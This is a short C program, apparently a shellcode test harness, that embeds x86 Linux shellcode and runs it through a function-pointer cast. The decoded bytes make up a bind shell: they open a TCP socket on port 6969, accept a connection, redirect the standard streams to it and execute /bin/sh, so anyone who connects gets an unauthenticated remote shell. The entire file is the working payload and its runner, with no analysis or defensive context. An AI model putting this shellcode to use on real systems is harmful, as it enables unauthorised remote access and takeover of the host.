#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xc0\x50\x40\x50\x40\x50\x89"
                            "\xe1\x89\xc3\x4b\xb0\x66\xcd\x80"
                            "\x96\x31\xd2\x52\x52\x52\x52\xc6"
                            "\x04\x24\x02\x66\xc7\x44\x24\x02"
                            "\x1b\x39\x89\xe1\x6a\x10\x51\x56"
                            "\x89\xe1\x6a\x66\x58\x43\xcd\x80"
                            "\x52\x56\x89\xe1\x6a\x66\x58\xb3"
                            "\x04\xcd\x80\x52\x52\x56\x89\xe1"
                            "\x6a\x66\x58\xb3\x05\xcd\x80\x93"
                            "\x6a\x02\x59\x6a\x3f\x58\xcd\x80"
                            "\x49\x79\xf8\x31\xc9\x52\x68\x6e"
                            "\x2f\x73\x68\x68\x2f\x2f\x62\x69"
                            "\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";

int main(void) {
  printf("[*] shellcode length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
  return 0;
}

